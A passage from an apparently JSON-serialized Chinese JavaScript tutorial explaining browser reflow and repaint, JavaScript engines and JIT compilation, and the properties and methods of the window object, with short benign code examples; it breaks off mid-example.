<p>渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。</p>\n<p>页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。用户的互动也会触发重流和重绘，比如设置了鼠标悬停（<code>a:hover</code>）效果、页面滚动、在输入框中输入文本、改变窗口大小等等。</p>\n<p>重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。</p>\n<p>大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，最小化所耗费的代价，而不会全局重新生成网页。</p>\n<p>作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，而以底层 DOM 元素的变动代替；再比如，重绘<code>table</code>布局和<code>flex</code>布局，开销都会比较大。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = document.getElementById(&#039;foobar&#039;);\n\nfoo.style.color = &#039;blue&#039;;\nfoo.style.marginTop = &#039;30px&#039;;</code></pre><p>上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。</p>\n<p>下面是一些优化技巧。</p>\n<ul>\n<li>读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，然后立刻写入，接着再读取一个 DOM 节点。</li>\n<li>缓存 DOM 信息。</li>\n<li>不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。</li>\n<li>使用<code>documentFragment</code>操作 DOM</li>\n<li>动画使用<code>absolute</code>定位或<code>fixed</code>定位，这样可以减少对其他元素的影响。</li>\n<li>只在必要时才显示隐藏元素。</li>\n<li>使用<code>window.requestAnimationFrame()</code>，因为它可以把代码推迟到下一次重流时执行，而不是立即要求页面重流。</li>\n<li>使用虚拟DOM（virtual DOM）库。</li>\n</ul>\n<p>下面是一个<code>window.requestAnimationFrame()</code>对比效果的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 重绘代价高\nfunction doubleHeight(element) {\n  var currentHeight = element.clientHeight;\n  element.style.height = (currentHeight * 2) + &#039;px&#039;;\n}\n\nall_my_elements.forEach(doubleHeight);\n\n// 重绘代价低\nfunction doubleHeight(element) {\n  var currentHeight = element.clientHeight;\n\n  window.requestAnimationFrame(function () {\n    element.style.height = (currentHeight * 2) + &#039;px&#039;;\n  });\n}\n\nall_my_elements.forEach(doubleHeight);</code></pre><p>上面的第一段代码，每读一次 DOM，就写入新的值，会造成不停的重排和重流。第二段代码把所有的写操作，都累积在一起，从而 DOM 代码变动的代价就最小化了。</p>\n\n        <h3>\n            <a href='#JavaScript-引擎' class='header-anchor'>#</a>\n            <span>JavaScript 引擎</span>\n        </h3>\n    <p>JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。</p>\n<p>JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行都要调用解释器，系统开销较大，运行速度慢于编译型语言。</p>\n<p>为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，生成类似字节码（bytecode）的中间代码，以提高运行速度。</p>\n<p>早期，浏览器内部对 JavaScript 的处理过程如下：</p>\n<ol>\n<li>读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。</li>\n<li>对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。</li>\n<li>使用“翻译器”（translator），将代码转为字节码（bytecode）。</li>\n<li>使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。</li>\n</ol>\n<p>逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为采用“即时编译”（Just In Time compiler，缩写JIT），即字节码只在运行时编译，用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。</p>\n<p>字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，有的 JavaScript 虚拟机基于源码，即只要有可能，就通过JIT（just in time）编译器直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的一些JavaScript虚拟机：</p>\n<ul>\n<li>[Chakra](<a href=\"http://en.wikipedia.org/wiki/Chakra_(JScript_engine%5C))\">http://en.wikipedia.org/wiki/Chakra_(JScript_engine\\))</a>(Microsoft Internet Explorer)</li>\n<li><a href=\"http://en.wikipedia.org/wiki/WebKit#JavaScriptCore\">Nitro/JavaScript Core</a> (Safari)</li>\n<li><a href=\"http://dev.opera.com/articles/view/labs-carakan/\">Carakan</a> (Opera)</li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/SpiderMonkey\">SpiderMonkey</a> (Firefox)</li>\n<li>[V8](<a href=\"http://en.wikipedia.org/wiki/V8_(JavaScript_engine%5C)\">http://en.wikipedia.org/wiki/V8_(JavaScript_engine\\)</a>) (Chrome, Chromium)</li>\n</ul>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>John Dalziel, <a href=\"http://creativejs.com/2013/06/the-race-for-speed-part-2-how-javascript-compilers-work/\">The race for speed part 2: How JavaScript compilers work</a></li>\n<li>Jake Archibald，<a href=\"http://www.html5rocks.com/en/tutorials/speed/script-loading/\">Deep dive into the murky waters of script loading</a></li>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/window.setTimeout\">window.setTimeout</a></li>\n<li>Remy Sharp, <a href=\"http://remysharp.com/2010/07/21/throttling-function-calls/\">Throttling function calls</a></li>\n<li>Ayman Farhat, <a href=\"http://www.thecodeship.com/web-development/alternative-to-javascript-evil-setinterval/\">An alternative to Javascript&#39;s evil setInterval</a></li>\n<li>Ilya Grigorik, <a href=\"https://www.igvita.com/2014/05/20/script-injected-async-scripts-considered-harmful/\">Script-injected &quot;async scripts&quot; considered harmful</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2014/09/es6-promises-foundations.html\">ECMAScript 6 promises (1/2): foundations</a></li>\n<li>Daniel Imms, <a href=\"http://www.growingwiththeweb.com/2014/02/async-vs-defer-attributes.html\">async vs defer attributes</a></li>\n<li>Craig Buckler, <a href=\"http://www.sitepoint.com/non-blocking-async-defer/\">Load Non-blocking JavaScript with HTML5 Async and Defer</a></li>\n<li>Domenico De Felice, <a href=\"http://domenicodefelice.blogspot.sg/2015/08/how-browsers-work.html?t=2\">How browsers work</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"window 对象","link":"/bom/window.html"}],"content":"\n        <h1>\n            <a href='#window-对象' class='header-anchor'>#</a>\n            <span>window 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>浏览器里面，<code>window</code>对象（注意，<code>w</code>为小写）指当前的浏览器窗口。它也是当前页面的顶层对象，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，那么默认就是顶层对象的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>a = 1;\nwindow.a // 1</code></pre><p>上面代码中，<code>a</code>是一个没有声明就直接赋值的变量，它自动成为顶层对象的属性。</p>\n<p><code>window</code>有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把<code>window</code>对象当作顶层对象，所有未声明就赋值的变量都自动变成<code>window</code>对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。</p>\n\n        <h2>\n            <a href='#window-对象的属性' class='header-anchor'>#</a>\n            <span>window 对象的属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#window.name' class='header-anchor'>#</a>\n            <span>window.name</span>\n        </h3>\n    <p><code>window.name</code>属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，这个属性主要配合超链接和表单的<code>target</code>属性使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.name = &#039;Hello World!&#039;;\nconsole.log(window.name)\n// &quot;Hello World!&quot;</code></pre><p>该属性只能保存字符串，如果写入的值不是字符串，会自动转成字符串。各个浏览器对这个值的储存容量有所不同，但是一般来说，可以高达几MB。</p>\n<p>只要浏览器窗口不关闭，这个属性是不会消失的。举例来说，访问<code>a.com</code>时，该页面的脚本设置了<code>window.name</code>，接下来在同一个窗口里面载入了<code>b.com</code>，新页面的脚本可以读到上一个网页设置的<code>window.name</code>。页面刷新也是这种情况。一旦浏览器窗口关闭后，该属性保存的值就会消失，因为这是窗口已经不存在了。</p>\n\n        <h3>\n            <a href='#window.closed，window.opener' class='header-anchor'>#</a>\n            <span>window.closed，window.opener</span>\n        </h3>\n    <p><code>window.closed</code>属性返回一个布尔值，表示窗口是否关闭。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.closed // false</code></pre><p>上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口肯定没有关闭。这个属性一般用来检查，使用脚本打开的新窗口是否关闭。</p>\n<pre class=\"prettyprint language-javascript\"><code>var popup = window.open();\n\nif ((popup !== null) &amp;&amp; !popup.closed) {\n  // 窗口仍然打开着\n}</code></pre><p><code>window.opener</code>属性表示打开当前窗口的父窗口。如果当前窗口没有父窗口（即直接在地址栏输入打开），则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.open().opener === window // true</code></pre><p>上面表达式会打开一个新窗口，然后返回<code>true</code>。</p>\n<p>通过<code>opener</code>属性，可以获得父窗口的全局属性和方法，但只限于两个窗口同源的情况（参见《同源限制》一章），且其中一个窗口由另一个打开。<code>&lt;a&gt;</code>元素添加<code>rel=&quot;noopener&quot;</code>属性，可以防止新打开的窗口获取父窗口。</p>\n\n        <h3>\n            <a href='#window.self，window.window' class='header-anchor'>#</a>\n            <span>window.self，window.window</span>\n        </h3>\n    <p><code>window.self</code>和<code>window.window</code>属性都指向窗口本身。这两个属性只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.self === window // true\nwindow.window === window // true</code></pre>\n        <h3>\n            <a href='#window.frames，window.length' class='header-anchor'>#</a>\n            <span>window.frames，window.length</span>\n        </h3>\n    <p><code>window.frames</code>属性返回一个类似数组的对象，成员为页面内所有框架窗口，包括<code>frame</code>元素和<code>iframe</code>元素。<code>window.frames[0]</code>表示页面中第一个框架窗口。</p>\n<p>如果<code>iframe</code>元素设置了<code>id</code>或<code>name</code>属性，那么就可以用属性值，引用这个<code>iframe</code>窗口。比如<code>&lt;iframe name=&quot;myIFrame&quot;&gt;</code>可以用<code>frames[&#39;myIFrame&#39;]</code>或者<code>frames.myIFrame</code>来引用。</p>\n<p><code>frames</code>属性实际上是<code>window</code>对象的别名。</p>\n<pre class=\"prettyprint language-javascript\"><code>frames === window // true</code></pre><p>因此，<code>frames[0]</code>也可以用<code>window[0]</code>表示。但是，从语义上看，<code>frames</code>更清晰，而且考虑到<code>window</code>还是全局对象，因此推荐表示多窗口时，总是使用<code>frames[0]</code>的写法。更多介绍请看下文的《多窗口操作》部分。</p>\n<p><code>window.length</code>属性返回当前网页包含的框架总数。如果当前网页不包含<code>frame</code>和<code>iframe</code>元素，那么<code>window.length</code>就返回<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.frames.length === window.length // true</code></pre><p>上面代码表示，<code>window.frames.length</code>与<code>window.length</code>应该是相等的。</p>\n\n        <h3>\n            <a href='#window.frameElement' class='header-anchor'>#</a>\n            <span>window.frameElement</span>\n        </h3>\n    <p><code>window.frameElement</code>属性主要用于当前窗口嵌在另一个网页的情况（嵌入<code>&lt;object&gt;</code>、<code>&lt;iframe&gt;</code>或<code>&lt;embed&gt;</code>元素），返回当前窗口所在的那个元素节点。如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;iframe src=&quot;about.html&quot;&gt;&lt;/iframe&gt;\n\n// 下面的脚本在 about.html 里面\nvar frameEl = window.frameElement;\nif (frameEl) {\n  frameEl.src = &#039;other.html&#039;;\n}</code></pre><p>上面代码中，<code>frameEl</code>变量就是<code>&lt;iframe&gt;</code>元素。</p>\n\n        <h3>\n            <a href='#window.top，window.parent' class='header-anchor'>#</a>\n            <span>window.top，window.parent</span>\n        </h3>\n    <p><code>window.top</code>属性指向最顶层窗口，主要用于在子窗口里面获取顶层的父窗口。</p>\n<p><code>window.parent</code>属性指向父窗口。如果当前窗口没有父窗口，<code>window.parent</code>指向自身。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (window.parent !== window.top) {\n  // 表明当前窗口嵌入不止一层\n}</code></pre>\n        <h3>\n            <a href='#window.status' class='header-anchor'>#</a>\n            <span>window.status</span>\n        </h3>\n    <p><code>window.status</code>属性用于读写浏览器状态栏的文本。但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效。</p>\n\n        <h3>\n            <a href='#window.devicePixelRatio' class='header-anchor'>#</a>\n            <span>window.devicePixelRatio</span>\n        </h3>\n    <p><code>window.devicePixelRatio</code>属性返回一个数值，表示一个 CSS 像素的大小与一个物理像素的大小之间的比率。也就是说，它表示一个 CSS 像素由多少个物理像素组成。它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，因此可以显示较大像素的图片。</p>\n\n        <h3>\n            <a href='#位置大小属性' class='header-anchor'>#</a>\n            <span>位置大小属性</span>\n        </h3>\n    <p>以下属性返回<code>window</code>对象的位置信息和大小信息。</p>\n<p><strong>（1）window.screenX，window.screenY</strong></p>\n<p><code>window.screenX</code>和<code>window.screenY</code>属性，返回浏览器窗口左上角相对于当前屏幕左上角的水平距离和垂直距离（单位像素）。这两个属性只读。</p>\n<p><strong>（2） window.innerHeight，window.innerWidth</strong></p>\n<p><code>window.innerHeight</code>和<code>window.innerWidth</code>属性，返回网页在当前窗口中可见部分的高度和宽度，即“视口”（viewport）的大小（单位像素）。这两个属性只读。</p>\n<p>用户放大网页的时候（比如将网页从100%的大小放大为200%），这两个属性会变小。因为这时网页的像素大小不变（比如宽度还是960像素），只是每个像素占据的屏幕空间变大了，因为可见部分（视口）就变小了。</p>\n<p>注意，这两个属性值包括滚动条的高度和宽度。</p>\n<p><strong>（3）window.outerHeight，window.outerWidth</strong></p>\n<p><code>window.outerHeight</code>和<code>window.outerWidth</code>属性返回浏览器窗口的高度和宽度，包括浏览器菜单和边框（单位像素）。这两个属性只读。</p>\n<p><strong>（4）window.scrollX，window.scrollY</strong></p>\n<p><code>window.scrollX</code>属性返回页面的水平滚动距离，<code>window.scrollY</code>属性返回页面的垂直滚动距离，单位都为像素。这两个属性只读。</p>\n<p>注意，这两个属性的返回值不是整数，而是双精度浮点数。如果页面没有滚动，它们的值就是<code>0</code>。</p>\n<p>举例来说，如果用户向下拉动了垂直滚动条75像素，那么<code>window.scrollY</code>就是75左右。用户水平向右拉动水平滚动条200像素，<code>window.scrollX</code>就是200左右。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (window.scrollY &lt; 75) {\n  window.scroll(0, 75);\n}</code></pre><p>上面代码中，如果页面向下滚动的距离小于75像素，那么页面向下滚动75像素。</p>\n<p><strong>（5）window.pageXOffset，window.pageYOffset</strong></p>\n<p><code>window.pageXOffset</code>属性和<code>window.pageYOffset</code>属性，是<code>window.scrollX</code>和<code>window.scrollY</code>别名。</p>\n\n        <h3>\n            <a href='#组件属性' class='header-anchor'>#</a>\n            <span>组件属性</span>\n        </h3>\n    <p>组件属性返回浏览器的组件对象。这样的属性有下面几个。</p>\n<ul>\n<li><code>window.locationbar</code>：地址栏对象</li>\n<li><code>window.menubar</code>：菜单栏对象</li>\n<li><code>window.scrollbars</code>：窗口的滚动条对象</li>\n<li><code>window.toolbar</code>：工具栏对象</li>\n<li><code>window.statusbar</code>：状态栏对象</li>\n<li><code>window.personalbar</code>：用户安装的个人工具栏对象</li>\n</ul>\n<p>这些对象的<code>visible</code>属性是一个布尔值，表示这些组件是否可见。这些属性只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.locationbar.visible\nwindow.menubar.visible\nwindow.scrollbars.visible\nwindow.toolbar.visible\nwindow.statusbar.visible\nwindow.personalbar.visible</code></pre>\n        <h3>\n            <a href='#全局对象属性' class='header-anchor'>#</a>\n            <span>全局对象属性</span>\n        </h3>\n    <p>全局对象属性指向一些浏览器原生的全局对象。</p>\n<ul>\n<li><code>window.document</code>：指向<code>document</code>对象，详见《document 对象》一章。注意，这个属性有同源限制。只有来自同源的脚本才能读取这个属性。</li>\n<li><code>window.location</code>：指向<code>Location</code>对象，用于获取当前窗口的 URL 信息。它等同于<code>document.location</code>属性，详见《Location 对象》一章。</li>\n<li><code>window.navigator</code>：指向<code>Navigator</code>对象，用于获取环境信息，详见《Navigator 对象》一章。</li>\n<li><code>window.history</code>：指向<code>History</code>对象，表示浏览器的浏览历史，详见《History 对象》一章。</li>\n<li><code>window.localStorage</code>：指向本地储存的 localStorage 数据，详见《Storage 接口》一章。</li>\n<li><code>window.sessionStorage</code>：指向本地储存的 sessionStorage 数据，详见《Storage 接口》一章。</li>\n<li><code>window.console</code>：指向<code>console</code>对象，用于操作控制台，详见《console 对象》一章。</li>\n<li><code>window.screen</code>：指向<code>Screen</code>对象，表示屏幕信息，详见《Screen 对象》一章。</li>\n</ul>\n\n        <h3>\n            <a href='#window.isSecureContext' class='header-anchor'>#</a>\n            <span>window.isSecureContext</span>\n        </h3>\n    <p><code>window.isSecureContext</code>属性返回一个布尔值，表示当前窗口是否处在加密环境。如果是 HTTPS 协议，就是<code>true</code>，否则就是<code>false</code>。</p>\n\n        <h2>\n            <a href='#window-对象的方法' class='header-anchor'>#</a>\n            <span>window 对象的方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#window.alert()，window.prompt()，window.confirm()' class='header-anchor'>#</a>\n            <span>window.alert()，window.prompt()，window.confirm()</span>\n        </h3>\n    <p><code>window.alert()</code>、<code>window.prompt()</code>、<code>window.confirm()</code>都是浏览器与用户互动的全局方法。它们会弹出不同的对话框，要求用户做出回应。注意，这三个方法弹出的对话框，都是浏览器统一规定的式样，无法定制。</p>\n<p><strong>（1）window.alert()</strong></p>\n<p><code>window.alert()</code>方法弹出的对话框，只有一个“确定”按钮，往往用来通知用户某些信息。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.alert(&#039;Hello World&#039;);</code></pre><p>用户只有点击“确定”按钮，对话框才会消失。对话框弹出期间，浏览器窗口处于冻结状态，如果不点“确定”按钮，用户什么也干不了。</p>\n<p><code>window.alert()</code>方法的参数只能是字符串，没法使用CSS样式，但是可以用<code>\\n</code>指定换行。</p>\n<pre class=\"prettyprint language-javascript\"><code>alert(&#039;本条提示\\n分成两行&#039;);</code></pre><p><strong>（2）window.prompt()</strong></p>\n<p><code>window.prompt()</code>方法弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var result = prompt(&#039;您的年龄？&#039;, 25)</code></pre><p>上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中输入自己的年龄（默认显示25）。用户填入的值，会作为返回值存入变量<code>result</code>。</p>\n<p><code>window.prompt()</code>的返回值有两种情况，可能是字符串（有可能是空字符串），也有可能是<code>null</code>。具体分成三种情况。</p>\n<ol>\n<li>用户输入信息，并点击“确定”，则用户输入的信息就是返回值。</li>\n<li>用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。</li>\n<li>用户点击了“取消”（或者按了 ESC 按钮），则返回值是<code>null</code>。</li>\n</ol>\n<p><code>window.prompt()</code>方法的第二个参数是可选的，但是最好总是提供第二个参数，作为输入框的默认值。</p>\n<p><strong>（3）window.confirm()</strong></p>\n<p><code>window.confirm()</code>方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，往往用来征询用户是否同意。</p>\n<pre class=\"prettyprint language-javascript\"><code>var result = confirm(&#039;你最近好吗？&#039;);</code></pre><p>上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。</p>\n<p><code>confirm</code>方法返回一个布尔值，如果用户点击“确定”，返回<code>true</code>；如果用户点击“取消”，则返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var okay = confirm(&#039;Please confirm this message.&#039;);\nif (okay) {\n  // 用户按下“确定”\n} else {\n  // 用户按下“取消”\n}</code></pre><p><code>confirm</code>的一个用途是，用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onunload = function () {\n  return window.confirm(&#039;你确定要离开当面页面吗？&#039;);\n}</code></pre><p>这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。</p>\n\n        <h3>\n            <a href='#window.open(),-window.close()，window.stop()' class='header-anchor'>#</a>\n            <span>window.open(), window.close()，window.stop()</span>\n        </h3>\n    <p><strong>（1）window.open()</strong></p>\n<p><code>window.open</code>方法用于新建另一个浏览器窗口，类似于浏览器菜单的新建窗口选项。它会返回新窗口的引用，如果无法新建窗口，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var popup = window.open(&#039;somefile.html&#039;);</code></pre><p>上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的<code>somefile.html</code>。</p>\n<p><code>open</code>方法一共可以接受三个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.open(url, windowName, [windowFeatures])</code></pre><ul>\n<li><code>url</code>：字符串，表示新窗口的网址。如果省略，默认网址就是<code>about:blank</code>。</li>\n<li><code>windowName</code>：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，不再新建窗口。如果省略，就默认使用<code>_blank</code>，表示新建一个没有名字的窗口。</li>\n<li><code>windowFeatures</code>：字符串，内容为逗号分隔的键值对（详见下文），表示新窗口的参数，比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。如果新建的是一个已经存在的窗口，则该参数不起作用，浏览器沿用以前窗口的参数。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var popup = window.open(\n  &#039;somepage.html&#039;,\n  &#039;DefinitionsWindows&#039;,\n  &#039;height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes&#039;\n);</code></pre><p>上面代码表示，打开的新窗口高度和宽度都为200像素，没有地址栏和滚动条，但有状态栏，允许用户调整大小。</p>\n<p>第三个参数可以设定如下属性。</p>\n<ul>\n<li>left：新窗口距离屏幕最左边的距离（单位像素）。注意，新窗口必须是可见的，不能设置在屏幕以外的位置。</li>\n<li>top：新窗口距离屏幕最顶部的距离（单位像素）。</li>\n<li>height：新窗口内容区域的高度（单位像素），不得小于100。</li>\n<li>width：新窗口内容区域的宽度（单位像素），不得小于100。</li>\n<li>outerHeight：整个浏览器窗口的高度（单位像素），不得小于100。</li>\n<li>outerWidth：整个浏览器窗口的宽度（单位像素），不得小于100。</li>\n<li>menubar：是否显示菜单栏。</li>\n<li>toolbar：是否显示工具栏。</li>\n<li>location：是否显示地址栏。</li>\n<li>personalbar：是否显示用户自己安装的工具栏。</li>\n<li>status：是否显示状态栏。</li>\n<li>dependent：是否依赖父窗口。如果依赖，那么父窗口最小化，该窗口也最小化；父窗口关闭，该窗口也关闭。</li>\n<li>minimizable：是否有最小化按钮，前提是<code>dialog=yes</code>。</li>\n<li>noopener：新窗口将与父窗口切断联系，即新窗口的<code>window.opener</code>属性返回<code>null</code>，父窗口的<code>window.open()</code>方法也返回<code>null</code>。</li>\n<li>resizable：新窗口是否可以调节大小。</li>\n<li>scrollbars：是否允许新窗口出现滚动条。</li>\n<li>dialog：新窗口标题栏是否出现最大化、最小化、恢复原始大小的控件。</li>\n<li>titlebar：新窗口是否显示标题栏。</li>\n<li>alwaysRaised：是否显示在所有窗口的顶部。</li>\n<li>alwaysLowered：是否显示在父窗口的底下。</li>\n<li>close：新窗口是否显示关闭按钮。</li>\n</ul>\n<p>对于那些可以打开和关闭的属性，设为<code>yes</code>或<code>1</code>或不设任何值就表示打开，比如<code>status=yes</code>、<code>status=1</code>、<code>status</code>都会得到同样的结果。如果想设为关闭，不用写<code>no</code>，而是直接省略这个属性即可。也就是说，如果在第三个参数中设置了一部分属性，其他没有被设置的<code>yes/no</code>属性都会被设成<code>no</code>，只有<code>titlebar</code>和关闭按钮除外（它们的值默认为<code>yes</code>）。</p>\n<p>另外，<code>open</code>方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许<code>open</code>方法指向该窗口。</p>\n<p><code>window.open</code>方法返回新窗口的引用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var windowB = window.open(&#039;windowB.html&#039;, &#039;WindowB&#039;);\nwindowB.window.name // &quot;WindowB&quot;</code></pre><p>注意，如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能窗口对象获取对方的内部属性。</p>\n<p>下面是另一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var w = window.open();\nconsole.log(&#039;已经打开新窗口&#039;);\nw.location = &#039;http://example.com&#039;;</code></pre><p>上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向<code>example.com</code>。</p>\n<p>由于<code>open</code>这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。只允许在用户点击链接或按钮时，脚本做出反应，弹出新窗口。因此，有必要检查一下打开新窗口是否成功。</p>\n<pre class=\"prettyprint language-javascript\"><code>var popup = window.open();\nif (popup === null) {\n  // 新建窗口失败\n}</code></pre><p><strong>（2）window.close()</strong></p>\n<p><code>window.close</code>方法用于关闭当前窗口，一般只用来关闭<code>window.open</code>方法新建的窗口。</p>\n<pre class=\"prettyprint language-javascript\"><code>popup.close()</code></pre><p>该方法只对顶层窗口有效，<code>iframe</code>框架之中的窗口使用该方法无效。</p>\n<p><strong>（3）window.stop()</strong></p>\n<p><code>window.stop()</code>方法完全等同于单击浏览器的停止按钮，会停止加载图像、视频等正在或等待加载的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.stop()</code></pre>\n        <h3>\n            <a href='#window.moveTo()，window.moveBy()' class='header-anchor'>#</a>\n            <span>window.moveTo()，window.moveBy()</span>\n        </h3>\n    <p><code>window.moveTo()</code>方法用于移动浏览器窗口到指定位置。它接受两个参数，分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.moveTo(100, 200)</code></pre><p>上面代码将窗口移动到屏幕<code>(100, 200)</code>的位置。</p>\n<p><code>window.moveBy</code>方法将窗口移动到一个相对位置。它接受两个参数，分布是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.moveBy(25, 50)</code></pre><p>上面代码将窗口向右移动25像素、向下移动50像素。</p>\n<p>为了防止有人滥用这两个方法，随意移动用户的窗口，目前只有一种情况，浏览器允许用脚本移动窗口：该窗口是用<code>window.open</code>方法新建的，并且它所在的 Tab 页是当前窗口里面唯一的。除此以外的情况，使用上面两个方法都是无效的。</p>\n\n        <h3>\n            <a href='#window.resizeTo()，window.resizeBy()' class='header-anchor'>#</a>\n            <span>window.resizeTo()，window.resizeBy()</span>\n        </h3>\n    <p><code>window.resizeTo()</code>方法用于缩放窗口到指定大小。</p>\n<p>它接受两个参数，第一个是缩放后的窗口宽度（<code>outerWidth</code>属性，包含滚动条、标题栏等等），第二个是缩放后的窗口高度（<code>outerHeight</code>属性）。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.resizeTo(\n  window.screen.availWidth / 2,\n  window.screen.availHeight / 2\n)</code></pre><p>上面代码将当前窗口缩放到，屏幕可用区域的一半宽度和高度。</p>\n<p><code>window.resizeBy()</code>方法用于缩放窗口。它与<code>window.resizeTo()</code>的区别是，它按照相对的量缩放，<code>window.resizeTo()</code>需要给出缩放后的绝对大小。</p>\n<p>它接受两个参数，第一个是水平缩放的量，第二个是垂直缩放的量，单位都是像素。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.resizeBy(-200, -200)</code></pre><p>上面的代码将当前窗口的宽度和高度，都缩小200像素。</p>\n\n        <h3>\n            <a href='#window.scrollTo()，window.scroll()，window.scrollBy()' class='header-anchor'>#</a>\n            <span>window.scrollTo()，window.scroll()，window.scrollBy()</span>\n        </h3>\n    <p><code>window.scrollTo</code>方法用于将文档滚动到指定位置。它接受两个参数，表示滚动后位于窗口左上角的页面坐标。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.scrollTo(x-coord, y-coord)</code></pre><p>它也可以接受一个配置对象作为参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.scrollTo(options)</code></pre><p>配置对象<code>options</code>有三个属性。</p>\n<ul>\n<li><code>top</code>：滚动后页面左上角的垂直坐标，即 y 坐标。</li>\n<li><code>left</code>：滚动后页面左上角的水平坐标，即 x 坐标。</li>\n<li><code>behavior</code>：字符串，表示滚动的方式，有三个可能值（<code>smooth</code>、<code>instant</code>、<code>auto</code>），默认值为<code>auto</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>window.scrollTo({\n  top: 1000,\n  behavior: 